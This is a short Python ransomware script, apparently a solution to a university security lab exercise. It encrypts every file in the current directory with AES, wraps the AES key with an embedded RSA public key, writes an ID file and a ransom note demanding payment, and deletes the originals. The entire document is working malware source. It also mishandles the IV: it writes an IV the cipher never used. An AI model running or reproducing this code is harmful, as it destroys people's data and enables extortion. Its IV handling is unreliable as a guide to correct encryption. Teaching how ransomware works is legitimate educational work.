import os
import secrets
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA




# Burning the public key into R6.py
e_key = open("/home/cse/Lab3/Solutions/e.key", 'rb').read()




# Function to encrypt file with public key
def encrypt_file(filename, public_key):
    # Generate shared key
    shared_key = os.urandom(16)
    # Generate RSA cipher
    cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))




    # Encrypt file using shared (symmetric) key
    with open(filename, "rb") as f:
        data = f.read()
    data = pad(data, AES.block_size)
    iv = os.urandom(AES.block_size)
    cipher_aes = AES.new(shared_key, AES.MODE_CBC)
    # encrypt the shared key using asymmetric encryption
    encrypted_key = cipher_rsa.encrypt(shared_key)
    encrypted_data = cipher_aes.encrypt(data)




    # create filename.encrypted file
    with open(f"{filename}.encrypted", "wb") as f:
        f.write(iv + encrypted_data)




    # generate unique identifier
    identifier = secrets.token_hex(16)




    # generate filename.ID file
    with open(f"{filename}.ID", 'w') as f:
        f.write(identifier+"\n")




    # write ransom note and generate file
    ransomnote = f"To get the decryption key for the file, send payment and the following key to the attacker: {identifier}\n"
    with open(f"{filename}.note", "w") as f:
        f.write(ransomnote)




    # generate file which has the encrypted shared key that the attacker can then use to decrypt the file
    with open(f"{filename}.key", "wb") as f:
        f.write(encrypted_key)




    # Remove original file
    os.remove(filename)








# Encrypt all files in current directory
for filename in os.listdir(os.getcwd()):
    if filename != "R6.py":
        if os.path.isfile(filename) and not filename.endswith("encrypted"):
            # Encrypt file with shared key
            encrypt_file(filename, e_key)
